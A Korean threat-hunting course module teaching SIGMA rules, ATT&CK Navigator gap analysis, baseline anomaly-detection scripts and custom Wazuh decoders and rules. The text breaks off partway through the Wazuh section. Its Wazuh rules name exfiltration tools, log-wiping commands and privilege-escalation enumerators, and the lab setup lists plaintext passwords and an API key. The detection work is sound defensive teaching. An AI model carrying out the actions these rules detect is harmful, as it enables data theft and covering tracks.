# Week 08: 위협 헌팅 — SIGMA 룰, ATT&CK Navigator, 베이스라인 이탈 탐지, Wazuh 커스텀 룰, YARA 룰

## 학습 목표
- SIGMA 룰의 구조를 이해하고 커스텀 탐지 규칙을 작성하여 다양한 SIEM에 변환·배포할 수 있다
- ATT&CK Navigator를 활용하여 조직의 탐지 커버리지를 시각화하고 갭을 분석할 수 있다
- 베이스라인 이탈 탐지 기법을 구현하여 정상 패턴에서 벗어나는 비정상 행위를 식별할 수 있다
- Wazuh 커스텀 디코더와 룰을 작성하여 조직 특화 위협을 탐지할 수 있다
- YARA 룰을 작성하여 파일 시스템과 메모리에서 악성코드를 탐지할 수 있다
- OpsClaw execute-plan을 통해 프로액티브 위협 헌팅 워크플로우를 자동화할 수 있다

## 전제 조건
- 공방전 기초 과정(course11) 이수 완료
- Week 01-07 학습 완료 (공격 기법 + 방어 + 포렌식 이해)
- Suricata/Wazuh 룰 작성 경험 (Week 05-06에서 학습)
- MITRE ATT&CK 프레임워크 기초 개념 이해
- 정규표현식 기본 문법
- OpsClaw 플랫폼 기본 사용법 (프로젝트 생성, execute-plan)

## 실습 환경 (공통)

| 호스트 | IP | 역할 | 접속 |
|--------|-----|------|------|
| opsclaw | 10.20.30.201 | 공격 기지 / Control Plane | `ssh opsclaw@10.20.30.201` (pw: 1) |
| secu | 10.20.30.1 | 방화벽/IPS (nftables, Suricata) | `sshpass -p1 ssh secu@10.20.30.1` |
| web | 10.20.30.80 | 웹 서버 (JuiceShop, Apache) | `sshpass -p1 ssh web@10.20.30.80` |
| siem | 10.20.30.100 | SIEM (Wazuh, OpenCTI) | `sshpass -p1 ssh siem@10.20.30.100` |

**OpsClaw API:** `http://localhost:8000` / Key: `opsclaw-api-key-2026`

## 강의 시간 배분 (3시간)

| 시간 | 내용 | 유형 |
|------|------|------|
| 0:00-0:40 | Part 1: SIGMA 룰 작성 및 변환 | 강의/실습 |
| 0:40-1:20 | Part 2: ATT&CK Navigator와 베이스라인 이탈 탐지 | 강의/실습 |
| 1:20-1:30 | 휴식 | - |
| 1:30-2:10 | Part 3: Wazuh 커스텀 룰 심화 | 강의/실습 |
| 2:10-2:50 | Part 4: YARA 룰과 프로액티브 헌팅 워크플로우 | 실습 |
| 2:50-3:00 | 휴식 | - |
| 3:00-3:20 | 종합 시나리오: 위협 헌팅 캠페인 실습 | 실습/토론 |
| 3:20-3:40 | 검증 퀴즈 + 과제 안내 | 퀴즈 |

---

## 용어 해설

| 용어 | 영문 | 설명 | 비유 |
|------|------|------|------|
| **위협 헌팅** | Threat Hunting | 알림 없이도 능동적으로 위협을 찾아내는 활동 | 수색대가 범인을 직접 추적 |
| **SIGMA** | SIGMA | SIEM 벤더 중립적 탐지 룰 포맷 | 탐지 룰의 에스페란토어 |
| **ATT&CK** | ATT&CK | MITRE의 공격 기술 지식 베이스 | 공격 기법 백과사전 |
| **Navigator** | ATT&CK Navigator | ATT&CK 매트릭스를 시각화하는 도구 | 공격/방어 지도 |
| **베이스라인** | Baseline | 정상 상태의 기준선 | 체온의 정상 범위 |
| **이탈 탐지** | Anomaly Detection | 정상 패턴에서 벗어나는 것을 탐지 | 평소와 다른 행동 포착 |
| **YARA** | YARA | 패턴 매칭 기반 악성코드 탐지 룰 | 악성코드 지문 대조 |
| **디코더** | Decoder | Wazuh에서 로그를 파싱하는 규칙 | 번역기 |
| **프로액티브** | Proactive | 사전에 능동적으로 대응 | 화재 전 점검 |
| **가설 기반** | Hypothesis-driven | 특정 위협 가설을 세우고 검증 | 범인 프로파일링 |
| **IOC** | Indicator of Compromise | 침해 지표 | 범인의 지문/발자국 |
| **TTP** | Tactics, Techniques, Procedures | 공격자의 전술/기술/절차 | 범인의 범행 수법 |

---

# Part 1: SIGMA 룰 작성 및 변환 (40분)

## 1.1 SIGMA 룰의 개요

SIGMA는 SIEM 벤더에 독립적인 범용 탐지 룰 포맷이다. 하나의 SIGMA 룰을 작성하면 Splunk, Elasticsearch, QRadar, Wazuh 등 다양한 SIEM으로 자동 변환할 수 있다.

### SIGMA 룰 생태계

```
+--------------------------------------------------------------+
|                    SIGMA 룰 생태계                            |
+--------------------------------------------------------------+
|                                                              |
|  [SIGMA 룰 (YAML)]                                          |
|       |                                                      |
|       ▼                                                      |
|  [sigmac / sigma-cli] -- 변환 엔진                           |
|       |                                                      |
|       +--> Splunk SPL 쿼리                                   |
|       +--> Elasticsearch Query DSL                           |
|       +--> QRadar AQL                                        |
|       +--> Wazuh 룰 XML                                     |
|       +--> Suricata 룰                                       |
|       +--> Microsoft Sentinel KQL                            |
|       +--> grep 명령 (간이 검색)                              |
|                                                              |
|  장점:                                                       |
|    - Write Once, Deploy Everywhere                           |
|    - 커뮤니티 공유 (3000+ 룰 공개)                            |
|    - ATT&CK 매핑 내장                                        |
|    - Git 기반 버전 관리 가능                                  |
|                                                              |
+--------------------------------------------------------------+
```

### SIGMA 룰 구조

```yaml
# SIGMA 룰 기본 구조
title: 탐지 룰 제목
id: 고유 UUID
status: experimental | test | stable
description: 상세 설명
references:
    - https://참고URL
author: 작성자
date: 2026/03/25
modified: 2026/04/01
tags:
    - attack.initial_access     # ATT&CK 전술
    - attack.t1190              # ATT&CK 기법
logsource:
    category: webserver         # 로그 유형
    product: apache             # 제품
detection:
    selection:                  # 매칭 조건
        field_name|contains: 'pattern'
    condition: selection        # 조건 조합
falsepositives:
    - 정상 활동 설명
level: high                     # critical, high, medium, low, informational
```

## 1.2 SIGMA 룰 작성 실습

### 실습 1: SIGMA 룰 작성과 변환

**실습 목적**: SIGMA 룰 문법을 학습하고, 실전 위협 시나리오에 대한 탐지 룰을 작성하여 여러 SIEM 포맷으로 변환한다.

**배우는 것**: SIGMA YAML 문법, detection 로직(selection/filter/condition), sigmac를 이용한 변환, ATT&CK 태그 매핑

```bash
# -- opsclaw 서버에서 실행 --

# 1. sigma-cli 설치
echo "[+] sigma-cli 설치:"
echo "  pip3 install sigma-cli"
echo "  # 또는"
echo "  pip3 install pySigma pySigma-backend-elasticsearch pySigma-backend-splunk"

# 2. SIGMA 룰 작성 예시 1: 웹셸 탐지
echo ""
echo "[+] SIGMA 룰 1: 웹셸 업로드 탐지"
cat << 'SIGMA1_EOF'
title: Webshell Upload Detection
id: 8f2e9a3b-1c4d-5e6f-7a8b-9c0d1e2f3a4b
status: stable
description: |
    웹 서버의 업로드 디렉토리에 PHP/JSP/ASP 웹셸이 
    생성되는 것을 탐지한다.
references:
    - https://attack.mitre.org/techniques/T1505/003/
author: OpsClaw Security Team
date: 2026/04/01
tags:
    - attack.persistence
    - attack.t1505.003
logsource:
    category: webserver
    product: apache
detection:
    selection_method:
        cs-method:
            - 'POST'
            - 'PUT'
    selection_uri:
        cs-uri-stem|contains:
            - '/uploads/'
            - '/upload/'
            - '/tmp/'
    selection_ext:
        cs-uri-stem|endswith:
            - '.php'
            - '.jsp'
            - '.asp'
            - '.aspx'
            - '.phtml'
    condition: selection_method and selection_uri and selection_ext
falsepositives:
    - 정상적인 CMS 파일 업로드 (WordPress 등)
level: high
SIGMA1_EOF

# 3. SIGMA 룰 작성 예시 2: SSH 브루트포스 탐지
echo ""
echo "[+] SIGMA 룰 2: SSH 브루트포스 탐지"
cat << 'SIGMA2_EOF'
title: SSH Brute Force Detection
id: 2a3b4c5d-6e7f-8a9b-0c1d-2e3f4a5b6c7d
status: stable
description: |
    짧은 시간 내 다수의 SSH 인증 실패를 탐지하여
    브루트포스 공격을 식별한다.
author: OpsClaw Security Team
date: 2026/04/01
tags:
    - attack.credential_access
    - attack.t1110.001
logsource:
    category: authentication
    product: linux
detection:
    selection:
        action: failure
        service: sshd
    condition: selection | count(source_ip) by source_ip > 5
    timeframe: 5m
falsepositives:
    - 사용자가 비밀번호를 잊은 경우
    - 자동화 스크립트의 인증 실패
level: medium
SIGMA2_EOF

# 4. SIGMA 룰 작성 예시 3: 의심스러운 프로세스 실행
echo ""
echo "[+] SIGMA 룰 3: /tmp에서 바이너리 실행 탐지"
cat << 'SIGMA3_EOF'
title: Suspicious Binary Execution from Temp Directory
id: 3b4c5d6e-7f8a-9b0c-1d2e-3f4a5b6c7d8e
status: experimental
description: |
    /tmp, /dev/shm, /var/tmp 디렉토리에서 바이너리가 
    실행되는 것을 탐지한다. 악성코드가 자주 사용하는 경로이다.
author: OpsClaw Security Team
date: 2026/04/01
tags:
    - attack.execution
    - attack.t1059.004
    - attack.defense_evasion
    - attack.t1036
logsource:
    category: process_creation
    product: linux
detection:
    selection:
        Image|startswith:
            - '/tmp/'
            - '/dev/shm/'
            - '/var/tmp/'
    filter_known:
        Image|endswith:
            - '/apt-get'
            - '/dpkg'
    condition: selection and not filter_known
falsepositives:
    - 패키지 설치 시 임시 디렉토리 사용
    - 빌드 프로세스
level: high
SIGMA3_EOF

# 5. SIGMA 룰 작성 예시 4: DNS 터널링 탐지
echo ""
echo "[+] SIGMA 룰 4: DNS 터널링 탐지"
cat << 'SIGMA4_EOF'
title: DNS Tunneling - Long Subdomain Query
id: 4c5d6e7f-8a9b-0c1d-2e3f-4a5b6c7d8e9f
status: experimental
description: |
    비정상적으로 긴 DNS 서브도메인 쿼리를 탐지한다.
    DNS 터널링(iodine, dnscat2)의 전형적인 패턴이다.
author: OpsClaw Security Team
date: 2026/04/01
tags:
    - attack.exfiltration
    - attack.t1048.001
    - attack.command_and_control
    - attack.t1071.004
logsource:
    category: dns
detection:
    selection:
        query|re: '^[a-zA-Z0-9]{30,}\.'
    condition: selection | count() by src_ip > 10
    timeframe: 5m
falsepositives:
    - CDN 서비스의 긴 도메인
    - DKIM/SPF 관련 긴 TXT 쿼리
level: high
SIGMA4_EOF

# 6. SIGMA 룰 변환
echo ""
echo "[+] SIGMA 룰 변환 명령:"
echo ""
echo "  # Elasticsearch 쿼리로 변환"
echo "  sigma convert -t elasticsearch -p ecs_windows rule.yml"
echo ""
echo "  # Splunk SPL로 변환"
echo "  sigma convert -t splunk rule.yml"
echo ""
echo "  # Wazuh 룰로 변환"
echo "  sigma convert -t wazuh rule.yml"
echo ""
echo "  # grep 명령으로 변환 (간이 검색)"
echo "  sigma convert -t grep rule.yml"
echo ""
echo "  # 전체 룰셋 변환"
echo "  sigma convert -t elasticsearch -p ecs_linux rules/*.yml > es_queries.ndjson"
```

**명령어 해설**:
- `title/id/status`: 룰의 식별 정보. id는 UUID 형식으로 고유해야 한다
- `logsource`: 분석할 로그의 유형과 제품을 지정한다 (category: webserver, product: apache 등)
- `detection.selection`: 매칭할 필드와 패턴을 정의한다
- `condition`: selection들을 논리 연산자(and, or, not)로 조합한다
- `|contains`, `|endswith`, `|startswith`, `|re`: SIGMA의 필드 수정자(modifier)로 패턴 매칭 방식을 지정한다
- `count() by src_ip > 5`: 집계 조건으로, 동일 IP에서 5회 초과 발생 시 탐지한다

**결과 해석**: SIGMA 룰 하나로 Elasticsearch, Splunk, Wazuh 등 어떤 SIEM에서든 동일한 탐지 로직을 구현할 수 있다. 커뮤니티에서 공유된 3000+ 룰을 활용하면 빠르게 탐지 커버리지를 확장할 수 있다. ATT&CK 태그를 포함하면 탐지 커버리지 분석이 가능하다.

**실전 활용**: 위협 인텔리전스 보고서에서 새로운 TTPs가 공개되면, SIGMA 룰로 작성하여 모든 SIEM에 즉시 배포한다. SIGMA 룰을 Git으로 관리하면 버전 관리와 코드 리뷰가 가능하다.

**트러블슈팅**:
- sigma-cli 설치 오류: Python 3.8+ 필요
- 변환 실패: logsource의 category/product가 백엔드에서 지원되는지 확인
- 오탐: falsepositives에 알려진 정상 패턴을 문서화하고 filter로 제외

---

# Part 2: ATT&CK Navigator와 베이스라인 이탈 탐지 (40분)

## 2.1 ATT&CK Navigator로 탐지 커버리지 분석

### ATT&CK Navigator 개요

```
+--------------------------------------------------------------+
|              ATT&CK Navigator 활용                           |
+--------------------------------------------------------------+
|                                                              |
|  1. 탐지 커버리지 시각화                                      |
|     - 보유한 탐지 룰을 ATT&CK 기법에 매핑                    |
|     - 색상으로 커버리지 수준 표시 (빨강=미탐지, 녹색=탐지)     |
|     - 탐지 갭(Gap)을 즉시 식별                                |
|                                                              |
|  2. 위협 그룹 프로파일링                                      |
|     - 특정 APT 그룹의 TTPs를 오버레이                        |
|     - 우리 조직의 탐지 능력과 교차 비교                       |
|     - 우선순위가 높은 탐지 갭 식별                            |
|                                                              |
|  3. 보안 투자 우선순위                                        |
|     - 커버리지가 낮은 전술에 리소스 집중                       |
|     - 레드팀/블루팀 시뮬레이션 계획 수립                       |
|                                                              |
+--------------------------------------------------------------+
```

### 실습 2: ATT&CK Navigator 레이어 생성

**실습 목적**: ATT&CK Navigator에서 조직의 탐지 커버리지 레이어를 생성하고, 탐지 갭을 분석하여 우선순위를 결정한다.

**배우는 것**: Navigator JSON 레이어 포맷, 탐지 룰의 ATT&CK 매핑, 갭 분석 방법론

```bash
# -- opsclaw 서버에서 실행 --

# 1. ATT&CK Navigator 레이어 JSON 생성
echo "[+] ATT&CK Navigator 탐지 커버리지 레이어:"
cat << 'LAYER_EOF'
{
    "name": "OpsClaw Detection Coverage",
    "versions": {"attack": "14", "navigator": "4.9.1", "layer": "4.5"},
    "domain": "enterprise-attack",
    "description": "OpsClaw 환경의 탐지 커버리지 현황",
    "techniques": [
        {"techniqueID": "T1190", "score": 90, "comment": "Suricata SQLi/XSS 룰", "color": "#31a354"},
        {"techniqueID": "T1505.003", "score": 80, "comment": "Wazuh 웹셸 탐지", "color": "#31a354"},
        {"techniqueID": "T1110.001", "score": 95, "comment": "fail2ban + Suricata", "color": "#31a354"},
        {"techniqueID": "T1059.004", "score": 70, "comment": "SIGMA /tmp 실행 탐지", "color": "#74c476"},
        {"techniqueID": "T1048.001", "score": 85, "comment": "DNS 터널링 탐지", "color": "#31a354"},
        {"techniqueID": "T1071.001", "score": 60, "comment": "HTTPS C2 일부 탐지", "color": "#a1d99b"},
        {"techniqueID": "T1053.003", "score": 50, "comment": "crontab 변경 탐지", "color": "#c7e9c0"},
        {"techniqueID": "T1068", "score": 30, "comment": "권한 상승 일부 탐지", "color": "#fdae6b"},
        {"techniqueID": "T1003", "score": 20, "comment": "크리덴셜 덤프 미흡", "color": "#e6550d"},
        {"techniqueID": "T1550", "score": 10, "comment": "Pass-the-Hash 미탐지", "color": "#a63603"}
    ],
    "gradient": {
        "colors": ["#a63603", "#fdae6b", "#31a354"],
        "minValue": 0,
        "maxValue": 100
    }
}
LAYER_EOF

# 2. 갭 분석
echo ""
echo "[+] 탐지 갭 분석:"
echo "  +---------------------------------------------------------+"
echo "  | 전술              | 커버리지 | 갭                       |"
echo "  +---------------------------------------------------------+"
echo "  | Initial Access    | 90%      | 피싱 메일 탐지 부족      |"
echo "  | Execution         | 70%      | PowerShell 난독화 탐지   |"
echo "  | Persistence       | 50%      | systemd 서비스 등록      |"
echo "  | Privilege Esc     | 30%      | 커널 익스플로잇 탐지     |"
echo "  | Defense Evasion   | 40%      | 로그 삭제 탐지 부족     |"
echo "  | Credential Access | 20%      | 크리덴셜 덤프 전반      |"
echo "  | Lateral Movement  | 25%      | SSH 키 사용 탐지        |"
echo "  | Exfiltration      | 85%      | 클라우드 유출           |"
echo "  | C2                | 60%      | Domain Fronting 탐지    |"
echo "  +---------------------------------------------------------+"
echo ""
echo "  우선순위: Credential Access(20%) → Lateral Movement(25%)"
echo "            → Privilege Escalation(30%)"

# 3. 위협 그룹 오버레이
echo ""
echo "[+] APT 그룹 TTPs 오버레이 예시 (APT29/Cozy Bear):"
echo "  APT29 주요 기법:"
echo "    T1566.001 (피싱 첨부파일)"
echo "    T1059.001 (PowerShell)"
echo "    T1053.005 (Scheduled Task)"
echo "    T1550.002 (Pass the Hash)"
echo "    T1071.001 (HTTPS C2)"
echo "    T1048 (Exfiltration)"
echo ""
echo "  우리 탐지 커버리지와 교차 분석:"
echo "    T1566.001: 미탐지 → 이메일 보안 강화 필요"
echo "    T1059.001: 부분 탐지 → SIGMA 룰 추가 필요"
echo "    T1550.002: 미탐지 → 최우선 대응 필요"
```

**명령어 해설**:
- Navigator JSON의 `techniques` 배열에 각 기법의 `score`(0-100)와 `color`를 지정하여 커버리지를 시각화한다
- `score`: 탐지 능력 점수. 0=미탐지, 100=완전 탐지
- `gradient`: 점수에 따른 색상 그라데이션. 빨강(낮음) → 노랑(중간) → 녹색(높음)
- Navigator 웹 애플리케이션(https://mitre-attack.github.io/attack-navigator/)에 JSON을 업로드하면 시각화된다

**결과 해석**: 갭 분석 결과 Credential Access(20%)와 Lateral Movement(25%)가 가장 취약하다. APT29 같은 위협 그룹이 이 기법들을 주로 사용하므로 우선적으로 탐지 룰을 보강해야 한다.

**실전 활용**: 매 분기마다 Navigator 레이어를 업데이트하여 탐지 커버리지 개선 추이를 추적한다. 새 SIGMA 룰을 배포할 때마다 해당 ATT&CK 기법의 점수를 업데이트한다.

**트러블슈팅**:
- Navigator 접속: https://mitre-attack.github.io/attack-navigator/ (오프라인 버전도 가능)
- JSON 포맷 오류: `jq .` 명령으로 JSON 유효성 검증
- ATT&CK 버전: 최신 ATT&CK 버전과 Navigator 버전이 호환되는지 확인

## 2.2 베이스라인 이탈 탐지

### 실습 3: 시스템 베이스라인 수집과 이탈 탐지

**실습 목적**: 정상 상태의 시스템 베이스라인을 수집하고, 이탈(anomaly)을 자동으로 탐지하는 스크립트를 작성한다.

**배우는 것**: 베이스라인 수집 항목, 이탈 탐지 로직, 임계값 설정, 지속적 모니터링 체계

```bash
# -- opsclaw 서버에서 실행 --

# 1. 베이스라인 수집
echo "[+] 시스템 베이스라인 수집 스크립트:"
cat << 'BASELINE_SCRIPT'
#!/bin/bash
# /opt/scripts/collect_baseline.sh
# 정상 상태의 시스템 베이스라인 수집

BASELINE_DIR="/opt/baselines/$(date +%Y%m%d)"
mkdir -p "$BASELINE_DIR"

echo "[+] 베이스라인 수집 시작: $(date)"

# 1. 프로세스 베이스라인
ps -eo comm | sort -u > "$BASELINE_DIR/processes.txt"
echo "  프로세스: $(wc -l < "$BASELINE_DIR/processes.txt") 종류"

# 2. 네트워크 리스닝 포트 베이스라인
ss -tlnp | awk '{print $4}' | sort -u > "$BASELINE_DIR/listening_ports.txt"
echo "  리스닝 포트: $(wc -l < "$BASELINE_DIR/listening_ports.txt")개"

# 3. 사용자 계정 베이스라인
awk -F: '{print $1":"$3":"$7}' /etc/passwd > "$BASELINE_DIR/users.txt"
echo "  사용자 계정: $(wc -l < "$BASELINE_DIR/users.txt")개"

# 4. 크론탭 베이스라인
for user in $(cut -d: -f1 /etc/passwd); do
    crontab -l -u "$user" 2>/dev/null
done > "$BASELINE_DIR/crontabs.txt"
echo "  크론탭: $(wc -l < "$BASELINE_DIR/crontabs.txt") 항목"

# 5. SUID 바이너리 베이스라인
find / -perm -4000 -type f 2>/dev/null | sort > "$BASELINE_DIR/suid_files.txt"
echo "  SUID 파일: $(wc -l < "$BASELINE_DIR/suid_files.txt")개"

# 6. SSH 인증키 베이스라인
find /home -name "authorized_keys" -exec cat {} \; 2>/dev/null | sort > "$BASELINE_DIR/ssh_keys.txt"
echo "  SSH 키: $(wc -l < "$BASELINE_DIR/ssh_keys.txt")개"

# 7. systemd 서비스 베이스라인
systemctl list-unit-files --type=service --state=enabled 2>/dev/null | \
    awk '{print $1}' | sort > "$BASELINE_DIR/services.txt"
echo "  활성 서비스: $(wc -l < "$BASELINE_DIR/services.txt")개"

# 해시 저장
cd "$BASELINE_DIR" && sha256sum *.txt > hashes.sha256
echo "[+] 베이스라인 저장: $BASELINE_DIR"
BASELINE_SCRIPT

# 2. 이탈 탐지 스크립트
echo ""
echo "[+] 이탈 탐지 스크립트:"
cat << 'ANOMALY_SCRIPT'
#!/bin/bash
# /opt/scripts/detect_anomaly.sh
# 현재 상태와 베이스라인을 비교하여 이탈 탐지

BASELINE_DIR="/opt/baselines/latest"  # 심볼릭 링크
ALERT_SCRIPT="/opt/scripts/security_alert.sh"

echo "[+] 이탈 탐지: $(date)"

# 1. 새로운 프로세스 탐지
CURRENT_PROCS=$(ps -eo comm | sort -u)
NEW_PROCS=$(comm -13 "$BASELINE_DIR/processes.txt" <(echo "$CURRENT_PROCS"))
if [ -n "$NEW_PROCS" ]; then
    echo "[ANOMALY] 새로운 프로세스 발견:"
    echo "$NEW_PROCS" | while read -r proc; do
        echo "  + $proc"
        $ALERT_SCRIPT "medium" "anomaly" "새 프로세스: $proc" "베이스라인에 없음" "localhost" 2>/dev/null
    done
fi

# 2. 새로운 리스닝 포트 탐지
CURRENT_PORTS=$(ss -tlnp | awk '{print $4}' | sort -u)
NEW_PORTS=$(comm -13 "$BASELINE_DIR/listening_ports.txt" <(echo "$CURRENT_PORTS"))
if [ -n "$NEW_PORTS" ]; then
    echo "[ANOMALY] 새로운 리스닝 포트:"
    echo "$NEW_PORTS" | while read -r port; do
        echo "  + $port"
        $ALERT_SCRIPT "high" "anomaly" "새 포트: $port" "베이스라인에 없음" "localhost" 2>/dev/null
    done
fi

# 3. 새로운 사용자 계정 탐지
CURRENT_USERS=$(awk -F: '{print $1":"$3":"$7}' /etc/passwd)
NEW_USERS=$(comm -13 "$BASELINE_DIR/users.txt" <(echo "$CURRENT_USERS" | sort))
if [ -n "$NEW_USERS" ]; then
    echo "[ANOMALY] 새로운 사용자 계정:"
    echo "$NEW_USERS"
    $ALERT_SCRIPT "critical" "anomaly" "새 사용자 생성" "$NEW_USERS" "localhost" 2>/dev/null
fi

# 4. 새로운 SUID 파일 탐지
CURRENT_SUID=$(find / -perm -4000 -type f 2>/dev/null | sort)
NEW_SUID=$(comm -13 "$BASELINE_DIR/suid_files.txt" <(echo "$CURRENT_SUID"))
if [ -n "$NEW_SUID" ]; then
    echo "[ANOMALY] 새로운 SUID 파일:"
    echo "$NEW_SUID"
    $ALERT_SCRIPT "critical" "anomaly" "새 SUID 파일" "$NEW_SUID" "localhost" 2>/dev/null
fi

# 5. 크론탭 변경 탐지
CURRENT_CRON=$(for user in $(cut -d: -f1 /etc/passwd); do crontab -l -u "$user" 2>/dev/null; done)
if ! diff -q <(cat "$BASELINE_DIR/crontabs.txt") <(echo "$CURRENT_CRON") &>/dev/null; then
    echo "[ANOMALY] 크론탭 변경 탐지"
    diff "$BASELINE_DIR/crontabs.txt" <(echo "$CURRENT_CRON") 2>/dev/null
    $ALERT_SCRIPT "high" "anomaly" "크론탭 변경" "상세 확인 필요" "localhost" 2>/dev/null
fi

echo "[+] 이탈 탐지 완료"
ANOMALY_SCRIPT

# 3. 자동 실행 (크론탭)
echo ""
echo "[+] 자동 이탈 탐지 (크론탭):"
echo "  # 매 5분마다 이탈 탐지"
echo "  */5 * * * * /opt/scripts/detect_anomaly.sh >> /var/log/anomaly.log 2>&1"
echo ""
echo "  # 매주 베이스라인 갱신"
echo "  0 3 * * 0 /opt/scripts/collect_baseline.sh && ln -sf /opt/baselines/\$(date +%Y%m%d) /opt/baselines/latest"
```

**명령어 해설**:
- `comm -13 baseline current`: baseline에는 없고 current에만 있는 항목을 출력한다 (새로 추가된 것)
- `ps -eo comm | sort -u`: 실행 중인 프로세스명을 중복 제거하여 정렬한다
- `find / -perm -4000`: SUID 비트가 설정된 파일을 검색한다
- `diff -q`: 두 파일의 차이만 간략히 확인한다

**결과 해석**: 베이스라인 이탈 탐지는 "무엇이 새로운가?"라는 질문에 답한다. 새로운 프로세스, 포트, 사용자, SUID 파일, 크론탭 변경은 모두 침해의 잠재적 지표이다. 시그니처 기반 탐지가 알려진 공격만 탐지하는 반면, 베이스라인 이탈 탐지는 알려지지 않은 공격도 탐지할 수 있다.

**실전 활용**: 베이스라인은 변경 관리(Change Management) 프로세스와 연동해야 한다. 정상적인 변경(패치, 서비스 추가)은 베이스라인을 업데이트하고, 미인가 변경은 사고로 취급한다.

**트러블슈팅**:
- 베이스라인 수집 시간: find 명령이 오래 걸림 → 특정 디렉토리로 범위 제한
- 오탐 과다: 자주 변하는 프로세스를 화이트리스트에 추가
- 베이스라인 갱신 주기: 너무 자주 갱신하면 이탈을 놓침, 너무 드물면 오탐 증가

---

# Part 3: Wazuh 커스텀 룰 심화 (40분)

## 3.1 Wazuh 디코더와 룰의 관계

```
+--------------------------------------------------------------+
|              Wazuh 로그 처리 파이프라인                        |
+--------------------------------------------------------------+
|                                                              |
|  [로그 입력] → [Pre-decoder] → [Decoder] → [Rule] → [알림]  |
|                                                              |
|  Pre-decoder: 타임스탬프, 호스트명 추출 (자동)               |
|  Decoder: 로그 형식 파싱, 필드 추출 (regex)                  |
|  Rule: 디코딩된 필드에 조건 매칭 → 알림 레벨 결정            |
|                                                              |
+--------------------------------------------------------------+
```

### 실습 4: Wazuh 커스텀 디코더와 룰 작성

**실습 목적**: Wazuh에 커스텀 디코더와 룰을 작성하여 조직 특화 로그 형식을 파싱하고 위협을 탐지한다.

**배우는 것**: Wazuh 디코더 XML 문법, 룰 XML 문법, 디코더-룰 연동, wazuh-logtest를 이용한 테스트

```bash
# -- siem 서버에서 실행 (또는 OpsClaw를 통해 배포) --

# 1. 커스텀 디코더 작성 (애플리케이션 로그)
echo "[+] Wazuh 커스텀 디코더:"
cat << 'DECODER_EOF'
<!-- /var/ossec/etc/decoders/local_decoder.xml -->

<!-- OpsClaw 애플리케이션 로그 디코더 -->
<decoder name="opsclaw_app">
  <prematch>^\[OpsClaw\]</prematch>
</decoder>

<decoder name="opsclaw_app_detail">
  <parent>opsclaw_app</parent>
  <regex>^\[OpsClaw\] \[(\w+)\] (\S+) - (.+)</regex>
  <order>severity, module, message</order>
</decoder>

<!-- 웹 애플리케이션 커스텀 로그 디코더 -->
<decoder name="webapp_security">
  <prematch>^SECURITY_EVENT:</prematch>
</decoder>

<decoder name="webapp_security_detail">
  <parent>webapp_security</parent>
  <regex>^SECURITY_EVENT: type=(\w+) ip=(\S+) user=(\S+) detail=(.+)</regex>
  <order>event_type, srcip, user, detail</order>
</decoder>
DECODER_EOF

# 2. 커스텀 룰 작성
echo ""
echo "[+] Wazuh 커스텀 룰:"
cat << 'RULES_EOF'
<!-- /var/ossec/etc/rules/local_rules.xml -->
<group name="opsclaw,webapp,hunting,">

  <!-- === 위협 헌팅 룰 === -->

  <!-- Rule: 비정상 시간대 로그인 -->
  <rule id="100401" level="10">
    <if_sid>5501</if_sid>
    <time>00:00-06:00</time>
    <description>HUNT: 비정상 시간대(새벽) 로그인 탐지</description>
    <group>hunting,login_anomaly,</group>
  </rule>

  <!-- Rule: root 직접 SSH 로그인 -->
  <rule id="100402" level="12">
    <if_sid>5501</if_sid>
    <user>root</user>
    <description>HUNT: root 계정 직접 SSH 로그인</description>
    <group>hunting,root_login,</group>
  </rule>

  <!-- Rule: /tmp 디렉토리에서 바이너리 실행 -->
  <rule id="100403" level="12">
    <if_sid>5902</if_sid>
    <match>/tmp/|/dev/shm/|/var/tmp/</match>
    <description>HUNT: 임시 디렉토리에서 바이너리 실행</description>
    <group>hunting,execution,</group>
  </rule>

  <!-- Rule: 새 사용자 계정 생성 -->
  <rule id="100404" level="14">
    <if_sid>5902</if_sid>
    <match>useradd|adduser</match>
    <description>HUNT: 새 사용자 계정 생성 탐지</description>
    <group>hunting,persistence,</group>
  </rule>

  <!-- Rule: systemd 서비스 생성/변경 -->
  <rule id="100405" level="12">
    <if_sid>550</if_sid>
    <match>/etc/systemd/system/|/lib/systemd/system/</match>
    <description>HUNT: systemd 서비스 파일 변경 탐지</description>
    <group>hunting,persistence,</group>
  </rule>

  <!-- Rule: SSH authorized_keys 변경 -->
  <rule id="100406" level="14">
    <if_sid>550</if_sid>
    <match>authorized_keys</match>
    <description>HUNT: SSH authorized_keys 변경 탐지</description>
    <group>hunting,persistence,credential,</group>
  </rule>

  <!-- Rule: 대용량 아웃바운드 전송 (scp/rsync) -->
  <rule id="100407" level="10">
    <if_sid>5902</if_sid>
    <match>scp |rsync |rclone </match>
    <description>HUNT: 대용량 데이터 전송 도구 실행</description>
    <group>hunting,exfiltration,</group>
  </rule>

  <!-- Rule: 로그 삭제/변조 시도 -->
  <rule id="100408" level="14">
    <if_sid>5902</if_sid>
    <match>rm.*\.log|truncate.*\.log|>/var/log/|echo.*>/var/log/</match>
    <description>HUNT: 로그 삭제/변조 시도 탐지</description>
    <group>hunting,defense_evasion,</group>
  </rule>

  <!-- Rule: 권한 상승 도구 실행 -->
  <rule id="100409" level="14">
    <if_sid>5902</if_sid>
    <match>linpeas|linenum|pspy|sudo -l</match>
    <description>HUNT: 권한 상승 열거 도구 실행</description>
    <group>hunting,privilege_escalation,</group>
  </rule>

  <!-- Rule: 웹 앱 보안 이벤트 (커스텀 디코더 연동) -->
  <rule id="100410" level="10">
    <decoded_as>webapp_security</decoded_as>
    <field name="event_type">^login_fail$</field>
    <description>WEBAPP: 로그인 실패 - $(srcip) - $(user)</description>
    <group>hunting,webapp,</group>
  </rule>

</group>
RULES_EOF

# 3. 디코더/룰 테스트
echo ""
echo "[+] wazuh-logtest로 테스트:"
echo '  echo "[OpsClaw] [ERROR] subagent - Connection refused to 10.20.30.1:8002" | /var/ossec/bin/wazuh-logtest'
echo '  echo "SECURITY_EVENT: type=login_fail ip=1.2.3.4 user=admin detail=wrong password" | /var/ossec/bin/wazuh-logtest'

# 4. 룰 적용
echo ""
echo "[+] 룰 적용:"
echo "  /var/ossec/bin/wazuh-control restart"
echo "  # 또는"
echo "  systemctl restart wazuh-manager"
```

**명령어 해설**:
- `<prematch>`: 로그의 첫 부분을 매칭하여 적절한 디코더를 선택한다
- `<regex>`: 정규표현식으로 로그에서 필드를 추출한다. 괄호()로 캡처 그룹을 지정한다
- `<order>`: 캡처된 필드의 이름을 지정한다 (srcip, user, severity 등)
- `<if_sid>5501</if_sid>`: 상위 룰(5501=SSH 성공)에 매칭된 이벤트를 기반으로 추가 조건을 적용한다
